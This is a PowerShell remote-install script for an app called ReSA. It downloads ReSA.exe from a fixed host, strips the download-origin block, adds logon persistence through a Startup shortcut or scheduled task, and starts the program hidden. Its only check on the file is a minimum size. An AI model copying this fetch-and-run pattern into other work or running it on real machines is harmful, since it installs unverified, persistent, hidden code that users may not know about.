# ReSA remote install - ASCII only for PowerShell 5.1 compatibility
param(
    [switch]$Silent
)

$ErrorActionPreference = "Continue"
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Unblock-File -LiteralPath $scriptPath -ErrorAction SilentlyContinue
}
$BaseUrl = $env:RESA_INSTALL_BASE
if (-not $BaseUrl) {
    $BaseUrl = "https://olxp.cc/download"
}
$BaseUrl = $BaseUrl.Trim().TrimEnd("/")
if ($BaseUrl -match "\s") {
    $BaseUrl = ($BaseUrl -split "\s+")[0]
}

$Dir = Join-Path $env:LOCALAPPDATA "ReSA"
$Exe = Join-Path $Dir "ReSA.exe"
$TempExe = Join-Path $env:TEMP "ReSA-download.exe"
$TaskName = "ReSA"
$Url = ($BaseUrl + "/ReSA.exe")
$LogFile = Join-Path $env:TEMP "ReSA-install.log"
$script:HadError = $false

function Write-InstallLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
    if (-not $Silent) {
        Write-Host $Text
    }
}

function Fail-Install {
    param([string]$Text)
    $script:HadError = $true
    Write-InstallLog $Text
    if ($Silent) {
        try {
            $shell = New-Object -ComObject WScript.Shell
            $msg = "ReSA install failed.`n" + $Text + "`n`nLog: " + $LogFile
            $shell.Popup($msg, 0, "ReSA", 16) | Out-Null
        } catch {
            $null = $_
        }
    } else {
        Write-Host $Text -ForegroundColor Red
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutFile
    )

    $ProgressPreference = "SilentlyContinue"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {
        $null = $_
    }

    $curl = Join-Path $env:SystemRoot "System32\curl.exe"
    if (Test-Path -LiteralPath $curl) {
        & $curl -fsSL -o $OutFile $Url
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
            return
        }
    }

    $iwrArgs = @{
        Uri = $Url
        OutFile = $OutFile
        UseBasicParsing = $true
    }
    if ($PSVersionTable.PSVersion.Major -lt 6) {
        $iwrArgs.UserAgent = "ReSA-Installer/1.0"
    }
    Invoke-WebRequest @iwrArgs
}

Write-InstallLog "install start"
Write-InstallLog ("download: " + $Url)
Write-InstallLog ("target: " + $Dir)

try {
    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
} catch {
    $null = $_
}

Get-Process -Name "ReSA" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 500

if (Test-Path -LiteralPath $TempExe) {
    Remove-Item -LiteralPath $TempExe -Force -ErrorAction SilentlyContinue
}

try {
    Download-File -Url $Url -OutFile $TempExe
    Write-InstallLog "download ok"
} catch {
    Fail-Install ("download failed: " + $_.Exception.Message)
    exit 1
}

if (-not (Test-Path -LiteralPath $TempExe)) {
    Fail-Install "missing file after download"
    exit 1
}

$length = (Get-Item -LiteralPath $TempExe).Length
if ($length -lt 1048576) {
    Fail-Install ("file too small: " + $length + " bytes")
    exit 1
}

if (Test-Path -LiteralPath $Exe) {
    Remove-Item -LiteralPath $Exe -Force -ErrorAction SilentlyContinue
}

try {
    Move-Item -LiteralPath $TempExe -Destination $Exe -Force
} catch {
    Fail-Install ("copy failed: " + $_.Exception.Message)
    exit 1
}

Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue

$autostartOk = $false
try {
    $Startup = [Environment]::GetFolderPath("Startup")
    $Wsh = New-Object -ComObject WScript.Shell
    $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReSA.lnk"))
    $Link.TargetPath = $Exe
    $Link.WorkingDirectory = $Dir
    $Link.WindowStyle = 7
    $Link.Save()
    $autostartOk = $true
    Write-InstallLog "startup shortcut ok"
} catch {
    $null = $_
}

if (-not $autostartOk) {
    try {
        $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
        $autostartOk = $true
        Write-InstallLog "scheduled task ok"
    } catch {
        Fail-Install ("autostart failed: " + $_.Exception.Message)
        exit 1
    }
}

try {
    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
    Write-InstallLog "install complete"
    exit 0
} catch {
    Fail-Install ("start failed: " + $_.Exception.Message)
    exit 1
}
